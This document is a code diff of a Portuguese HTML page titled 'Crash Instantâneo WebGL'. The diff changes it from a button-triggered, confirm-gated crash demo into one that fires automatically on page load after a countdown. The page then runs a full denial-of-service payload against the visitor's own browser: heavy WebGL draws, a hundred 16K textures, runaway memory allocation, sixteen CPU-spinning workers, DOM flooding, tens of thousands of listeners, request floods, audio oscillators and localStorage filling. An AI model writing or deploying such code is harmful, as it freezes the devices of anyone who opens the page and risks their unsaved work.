@@ -2,202 +2,393 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Sistema de Crash Instantâneo</title>
+    <title>Crash Instantâneo WebGL</title>
     <style>
-        body { margin: 0; background: #000; color: #fff; font-family: Arial; text-align: center; }
-        canvas { border: 2px solid #fff; display: block; margin: 20px auto; }
-        #status { margin: 20px; font-size: 24px; color: red; }
-        #warning { margin: 10px; color: red; font-weight: bold; }
-        button { padding: 15px 30px; font-size: 18px; margin: 10px; cursor: pointer; }
+        body { 
+            margin: 0; 
+            background: #000; 
+            color: #fff; 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            overflow: hidden;
+        }
+        #warning { 
+            margin: 15px; 
+            color: red; 
+            font-weight: bold; 
+            font-size: 24px;
+            text-shadow: 0 0 10px #f00;
+            animation: blink 0.5s infinite alternate;
+        }
+        @keyframes blink {
+            from { opacity: 1; }
+            to { opacity: 0.3; }
+        }
+        #status { 
+            margin: 10px; 
+            font-size: 18px; 
+            color: #ff4444;
+        }
+        canvas { 
+            border: 2px solid #f00; 
+            display: block; 
+            margin: 10px auto; 
+            background: #111;
+        }
+        .countdown {
+            font-size: 48px;
+            color: #ff0000;
+            margin: 20px;
+            text-shadow: 0 0 15px #f00;
+        }
     </style>
 </head>
 <body>
-    <div id="warning">PERIGO EXTREMO: Isso TRAVARÁ seu dispositivo instantaneamente! Use apenas em máquina virtual ou hardware descartável.</div>
-    <div id="status">Clique no botão para iniciar o crash instantâneo</div>
-    
-    <button id="crashButton">INICIAR CRASH INSTANTÂNEO</button>
-    <canvas id="gl-canvas" width="400" height="300"></canvas>
+    <div id="warning">⚠️ ALERTA CRÍTICO: CRASH INICIANDO ⚠️</div>
+    <div id="status">Preparando sistemas de crash...</div>
+    <div class="countdown" id="countdown">3</div>
+    <canvas id="gl-canvas" width="800" height="600"></canvas>
 
     <script>
         // Inicializa WebGL
         const canvas = document.getElementById('gl-canvas');
-        const gl = canvas.getContext('webgl');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
         if (!gl) {
-            alert('WebGL não suportado. Use Chrome/Firefox atualizado.');
-            throw new Error('WebGL não suportado');
+            document.getElementById('status').textContent = 'WebGL não suportado. Usando métodos alternativos...';
+            // Fallback para crash sem WebGL
+            crashWithoutWebGL();
+        } else {
+            // Crash com WebGL
+            initWebGLCrash();
         }
 
-        // Shaders simples
-        const vertexShaderSource = `
-            attribute vec2 a_position;
-            void main() {
-                gl_Position = vec4(a_position, 0.0, 1.0);
-            }
-        `;
-        
-        const fragmentShaderSource = `
-            precision highp float;
-            void main() {
-                gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0);
-            }
-        `;
-
-        // Compila shaders
-        function createShader(gl, type, source) {
-            const shader = gl.createShader(type);
-            gl.shaderSource(shader, source);
-            gl.compileShader(shader);
-            return shader;
-        }
-
-        // Cria programa WebGL
-        const vertexShader = createShader(gl, gl.VERTEX_SHADER, vertexShaderSource);
-        const fragmentShader = createShader(gl, gl.FRAGMENT_SHADER, fragmentShaderSource);
-        const program = gl.createProgram();
-        gl.attachShader(program, vertexShader);
-        gl.attachShader(program, fragmentShader);
-        gl.linkProgram(program);
-        gl.useProgram(program);
-
-        // Função de crash instantâneo
-        function crashSystem() {
-            document.getElementById('status').textContent = 'CRASH INICIADO! TRAVANDO SISTEMA...';
-            
+        function initWebGLCrash() {
             try {
-                // 1. WebGL: Milhões de pontos + loop infinito
-                const vertexCount = 5000000; // 5 milhões de vértices
-                const crashVertices = new Float32Array(vertexCount * 2);
-                for (let i = 0; i < vertexCount * 2; i++) {
-                    crashVertices[i] = Math.random() * 2 - 1;
-                }
+                // Shaders extremamente pesados
+                const vertexShaderSource = `
+                    attribute vec2 a_position;
+                    uniform vec2 u_resolution;
+                    void main() {
+                        vec2 clipSpace = (a_position / u_resolution) * 2.0 - 1.0;
+                        gl_Position = vec4(clipSpace * vec2(1, -1), 0.0, 1.0);
+                        gl_PointSize = 100.0;
+                    }
+                `;
                 
+                const fragmentShaderSource = `
+                    precision highp float;
+                    uniform vec4 u_color;
+                    uniform float u_time;
+                    void main() {
+                        vec2 coord = gl_FragCoord.xy;
+                        vec4 color = u_color;
+                        
+                        // Cálculos extremamente pesados
+                        for (int i = 0; i < 5000; i++) {
+                            color.r += 0.0001 * sin(coord.x * 0.01 + float(i) * 0.1 + u_time);
+                            color.g += 0.0001 * cos(coord.y * 0.01 + float(i) * 0.2 + u_time);
+                            color.b += 0.0001 * sin(coord.x * 0.02 + coord.y * 0.02 + float(i) * 0.3 + u_time);
+                        }
+                        
+                        // Mais cálculos complexos
+                        for (int j = 0; j < 1000; j++) {
+                            color.a += 0.00001 * float(j);
+                            color.rgb *= 1.0001;
+                        }
+                        
+                        gl_FragColor = color;
+                    }
+                `;
+
+                // Compila shaders
+                function createShader(gl, type, source) {
+                    const shader = gl.createShader(type);
+                    gl.shaderSource(shader, source);
+                    gl.compileShader(shader);
+                    return shader;
+                }
+
+                // Cria programa
+                const vertexShader = createShader(gl, gl.VERTEX_SHADER, vertexShaderSource);
+                const fragmentShader = createShader(gl, gl.FRAGMENT_SHADER, fragmentShaderSource);
+                const program = gl.createProgram();
+                gl.attachShader(program, vertexShader);
+                gl.attachShader(program, fragmentShader);
+                gl.linkProgram(program);
+                gl.useProgram(program);
+
+                // Atributos e uniformes
                 const positionLocation = gl.getAttribLocation(program, 'a_position');
-                const crashBuffer = gl.createBuffer();
-                gl.bindBuffer(gl.ARRAY_BUFFER, crashBuffer);
-                gl.bufferData(gl.ARRAY_BUFFER, crashVertices, gl.STATIC_DRAW);
-                gl.enableVertexAttribArray(positionLocation);
-                gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);
+                const resolutionLocation = gl.getUniformLocation(program, 'u_resolution');
+                const colorLocation = gl.getUniformLocation(program, 'u_color');
+                const timeLocation = gl.getUniformLocation(program, 'u_time');
+                gl.uniform2f(resolutionLocation, canvas.width, canvas.height);
 
-                // Loop WebGL infinito e pesado
-                function crashWebGLLoop() {
-                    gl.clear(gl.COLOR_BUFFER_BIT);
-                    // Desenha múltiplas vezes por frame
+                // Contagem regressiva antes do crash
+                let countdown = 3;
+                const countdownElement = document.getElementById('countdown');
+                const countdownInterval = setInterval(() => {
+                    countdown--;
+                    countdownElement.textContent = countdown;
+                    if (countdown <= 0) {
+                        clearInterval(countdownInterval);
+                        countdownElement.textContent = "CRASH!";
+                        document.getElementById('status').textContent = 'CRASH INICIADO! TRAVANDO SISTEMA...';
+                        startExtremeCrash();
+                    }
+                }, 1000);
+
+                function startExtremeCrash() {
+                    // 1. WebGL: 10 MILHÕES de pontos + loop infinito
+                    const vertexCount = 10000000;
+                    const crashVertices = new Float32Array(vertexCount * 2);
+                    for (let i = 0; i < vertexCount * 2; i += 2) {
+                        crashVertices[i] = Math.random() * canvas.width;
+                        crashVertices[i + 1] = Math.random() * canvas.height;
+                    }
+                    const crashBuffer = gl.createBuffer();
+                    gl.bindBuffer(gl.ARRAY_BUFFER, crashBuffer);
+                    gl.bufferData(gl.ARRAY_BUFFER, crashVertices, gl.STATIC_DRAW);
+
+                    // Texturas enormes (16K x 16K)
+                    const textures = [];
                     for (let i = 0; i < 100; i++) {
-                        gl.drawArrays(gl.POINTS, 0, vertexCount);
-                    }
-                    // Texturas enormes em cada frame
-                    const texture = gl.createTexture();
-                    gl.bindTexture(gl.TEXTURE_2D, texture);
-                    const size = 16384; // Textura 16k x 16k
-                    const data = new Uint8Array(size * size * 4);
-                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
-                    
-                    requestAnimationFrame(crashWebGLLoop);
-                }
-                crashWebGLLoop();
-
-                // 2. Estouro de memória massivo
-                setTimeout(() => {
-                    const memoryArrays = [];
-                    while (true) {
-                        memoryArrays.push(new Float64Array(10000000)); // 10 milhões de doubles
-                        memoryArrays.push(new Array(5000000).fill({data: new Array(1000)})); // Objetos complexos
-                    }
-                }, 50);
-
-                // 3. Web Workers para múltiplos núcleos
-                function createCrashWorker() {
-                    const workerCode = `
-                        // CPU intensivo
-                        while(true) {
-                            let result = 0;
-                            for(let i = 0; i < 10000000; i++) {
-                                result += Math.sqrt(Math.sin(Math.cos(i)));
-                            }
-                            
-                            // Memória no worker
-                            const arr = [];
-                            for(let j = 0; j < 10000; j++) {
-                                arr.push(new Float64Array(100000));
-                            }
+                        const texture = gl.createTexture();
+                        gl.bindTexture(gl.TEXTURE_2D, texture);
+                        const size = 16384;
+                        const data = new Uint8Array(size * size * 4);
+                        for (let j = 0; j < data.length; j++) {
+                            data[j] = Math.random() * 255;
                         }
-                    `;
-                    
-                    const blob = new Blob([workerCode], { type: 'application/javascript' });
-                    const url = URL.createObjectURL(blob);
-                    return new Worker(url);
-                }
-
-                // Criar múltiplos workers
-                for (let i = 0; i < 8; i++) { // Para sistemas com até 8 cores
-                    setTimeout(() => createCrashWorker(), i * 100);
-                }
-
-                // 4. Bombardeio de DOM
-                setTimeout(() => {
-                    while (true) {
-                        for (let i = 0; i < 5000; i++) {
-                            const element = document.createElement('div');
-                            element.innerHTML = '<div>'.repeat(1000);
-                            document.body.appendChild(element);
-                        }
+                        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
+                        textures.push(texture);
                     }
-                }, 100);
 
-                // 5. Event listeners infinitos
-                setTimeout(() => {
-                    for (let i = 0; i < 10000; i++) {
-                        window.addEventListener('click', () => {
-                            const heavyCalc = () => {
-                                let total = 0;
-                                for (let j = 0; j < 1000000; j++) {
-                                    total += Math.random();
+                    // Loop WebGL extremo
+                    let frameCount = 0;
+                    function crashWebGLLoop() {
+                        frameCount++;
+                        gl.clear(gl.COLOR_BUFFER_BIT);
+                        gl.bindBuffer(gl.ARRAY_BUFFER, crashBuffer);
+                        gl.enableVertexAttribArray(positionLocation);
+                        gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);
+                        gl.uniform4f(colorLocation, Math.random(), Math.random(), Math.random(), 1);
+                        gl.uniform1f(timeLocation, frameCount * 0.01);
+                        
+                        // Desenha múltiplas vezes por frame
+                        for (let i = 0; i < 50; i++) {
+                            gl.drawArrays(gl.POINTS, 0, vertexCount);
+                        }
+                        
+                        // Alterna texturas para aumentar carga
+                        if (frameCount % 5 === 0) {
+                            const texIndex = frameCount % textures.length;
+                            gl.bindTexture(gl.TEXTURE_2D, textures[texIndex]);
+                        }
+                        
+                        requestAnimationFrame(crashWebGLLoop);
+                    }
+                    crashWebGLLoop();
+
+                    // 2. Estouro de memória MASSIVO
+                    setTimeout(() => {
+                        const memoryHogs = [];
+                        let memoryCounter = 0;
+                        function consumeMemory() {
+                            try {
+                                // Arrays gigantes de diferentes tipos
+                                memoryHogs.push(new Float64Array(5000000)); // 5 milhões de doubles
+                                memoryHogs.push(new Array(2000000).fill({data: new Array(1000)})); // Objetos complexos
+                                memoryHogs.push(new Uint32Array(10000000)); // 10 milhões de inteiros
+                                
+                                memoryCounter++;
+                                if (memoryCounter < 1000) { // Tentar criar 1000 arrays gigantes
+                                    setTimeout(consumeMemory, 10);
                                 }
-                                return total;
-                            };
-                            for (let k = 0; k < 100; k++) heavyCalc();
-                        });
-                    }
-                }, 150);
-
-                // 6. Intervalos infinitos
-                for (let i = 0; i < 100; i++) {
-                    setInterval(() => {
-                        const arr = new Array(100000).fill().map(() => Math.random());
-                        arr.sort((a, b) => a - b);
-                    }, 10);
-                }
-
-                // 7. Tentativas de rede (se disponível)
-                setTimeout(() => {
-                    setInterval(() => {
-                        for (let i = 0; i < 100; i++) {
-                            fetch(window.location.href).catch(() => {});
+                            } catch(e) {
+                                // Continua mesmo com erros de memória
+                                setTimeout(consumeMemory, 1);
+                            }
                         }
+                        consumeMemory();
                     }, 100);
-                }, 200);
+
+                    // 3. Web Workers extremos para todos os núcleos
+                    function createExtremeWorker() {
+                        const workerCode = `
+                            // CPU intensivo máximo
+                            while(true) {
+                                let result = 0;
+                                // Loop extremamente pesado
+                                for(let i = 0; i < 50000000; i++) {
+                                    result += Math.sqrt(Math.sin(Math.cos(Math.tan(i))));
+                                    if (i % 1000000 === 0) {
+                                        // Aloca memória periodicamente
+                                        const arr = new Float64Array(1000000);
+                                        for (let j = 0; j < arr.length; j++) {
+                                            arr[j] = Math.random();
+                                        }
+                                    }
+                                }
+                                
+                                // Mais alocação de memória
+                                const bigArray = [];
+                                for(let k = 0; k < 1000; k++) {
+                                    bigArray.push(new Array(100000).fill(Math.random()));
+                                }
+                            }
+                        `;
+                        
+                        const blob = new Blob([workerCode], { type: 'application/javascript' });
+                        const url = URL.createObjectURL(blob);
+                        return new Worker(url);
+                    }
+
+                    // Criar múltiplos workers (até 16 para sistemas com muitos núcleos)
+                    for (let i = 0; i < 16; i++) {
+                        setTimeout(() => {
+                            try {
+                                createExtremeWorker();
+                            } catch(e) {
+                                // Ignora erros
+                            }
+                        }, i * 50);
+                    }
+
+                    // 4. Bombardeio de DOM extremo
+                    setTimeout(() => {
+                        let domCounter = 0;
+                        function bombDOM() {
+                            for (let i = 0; i < 10000; i++) {
+                                const element = document.createElement('div');
+                                element.innerHTML = '<div style="width:100px;height:100px;background:red;">'.repeat(100);
+                                element.style.position = 'absolute';
+                                element.style.left = Math.random() * window.innerWidth + 'px';
+                                element.style.top = Math.random() * window.innerHeight + 'px';
+                                document.body.appendChild(element);
+                            }
+                            domCounter++;
+                            if (domCounter < 100) { // Criar 1 milhão de elementos
+                                setTimeout(bombDOM, 10);
+                            }
+                        }
+                        bombDOM();
+                    }, 200);
+
+                    // 5. Event listeners infinitos
+                    setTimeout(() => {
+                        for (let i = 0; i < 50000; i++) {
+                            window.addEventListener('mousemove', () => {
+                                const heavyCalc = () => {
+                                    let total = 0;
+                                    for (let j = 0; j < 1000000; j++) {
+                                        total += Math.sqrt(Math.sin(j) * Math.cos(j));
+                                    }
+                                    return total;
+                                };
+                                for (let k = 0; k < 10; k++) heavyCalc();
+                            }, {once: false});
+                        }
+                    }, 300);
+
+                    // 6. Intervalos infinitos extremos
+                    for (let i = 0; i < 500; i++) {
+                        setInterval(() => {
+                            const arr = new Array(100000).fill().map(() => Math.random());
+                            // Ordenação pesada
+                            for (let j = 0; j < 10; j++) {
+                                arr.sort((a, b) => {
+                                    const calcA = Math.sin(a) * Math.cos(a);
+                                    const calcB = Math.sin(b) * Math.cos(b);
+                                    return calcA - calcB;
+                                });
+                            }
+                        }, 1);
+                    }
+
+                    // 7. Tentativas de rede massivas
+                    setTimeout(() => {
+                        setInterval(() => {
+                            for (let i = 0; i < 500; i++) {
+                                try {
+                                    fetch(window.location.href + '?crash=' + Math.random()).catch(() => {});
+                                } catch(e) {}
+                            }
+                        }, 50);
+                    }, 400);
+
+                    // 8. Sobrecarga de áudio (se suportado)
+                    try {
+                        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                        const oscillators = [];
+                        for (let i = 0; i < 100; i++) {
+                            const oscillator = audioContext.createOscillator();
+                            oscillator.connect(audioContext.destination);
+                            oscillator.frequency.value = 100 + Math.random() * 1000;
+                            oscillator.start();
+                            oscillators.push(oscillator);
+                        }
+                    } catch(e) {}
+
+                    // 9. LocalStorage bomb
+                    setTimeout(() => {
+                        let storageCounter = 0;
+                        function bombStorage() {
+                            try {
+                                localStorage.setItem('crash_data_' + storageCounter, 'x'.repeat(1000000));
+                                storageCounter++;
+                                if (storageCounter < 100) {
+                                    setTimeout(bombStorage, 10);
+                                }
+                            } catch(e) {}
+                        }
+                        bombStorage();
+                    }, 500);
+                }
 
             } catch (e) {
-                // Ignora erros - o objetivo é crashar mesmo
-                console.error('Erro durante crash:', e);
+                document.getElementById('status').textContent = 'Erro no WebGL. Usando métodos alternativos...';
+                crashWithoutWebGL();
             }
         }
 
-        // Inicia crash instantaneamente ao clicar no botão
-        document.getElementById('crashButton').addEventListener('click', () => {
-            document.body.style.backgroundColor = 'red';
-            crashSystem();
-        });
-
-        // Opcional: iniciar automaticamente após 3 segundos
-        setTimeout(() => {
-            if (!confirm('CRASH IRÁ INICIAR EM 5 SEGUNDOS! Clique OK para continuar ou CANCELAR para abortar.')) {
-                return;
+        function crashWithoutWebGL() {
+            document.getElementById('status').textContent = 'CRASH INICIADO (sem WebGL)! TRAVANDO SISTEMA...';
+            
+            // Métodos alternativos de crash
+            // 1. Estouro de memória
+            const memoryArrays = [];
+            function consumeMemory() {
+                try {
+                    memoryArrays.push(new Array(10000000).fill(0));
+                    setTimeout(consumeMemory, 1);
+                } catch(e) {
+                    setTimeout(consumeMemory, 1);
+                }
             }
-            document.getElementById('status').textContent = 'INICIANDO CRASH AUTOMÁTICO EM 5s...';
-            setTimeout(crashSystem, 5000);
-        }, 3000);
-
+            consumeMemory();
+            
+            // 2. CPU intensivo
+            function maxCPU() {
+                let result = 0;
+                for (let i = 0; i < 100000000; i++) {
+                    result += Math.sqrt(Math.sin(i) * Math.cos(i));
+                }
+                setTimeout(maxCPU, 1);
+            }
+            for (let i = 0; i < 8; i++) {
+                setTimeout(maxCPU, i * 10);
+            }
+            
+            // 3. DOM bomb
+            setInterval(() => {
+                for (let i = 0; i < 1000; i++) {
+                    const div = document.createElement('div');
+                    div.innerHTML = 'x'.repeat(10000);
+                    document.body.appendChild(div);
+                }
+            }, 10);
+        }
     </script>
 </body>
 </html>
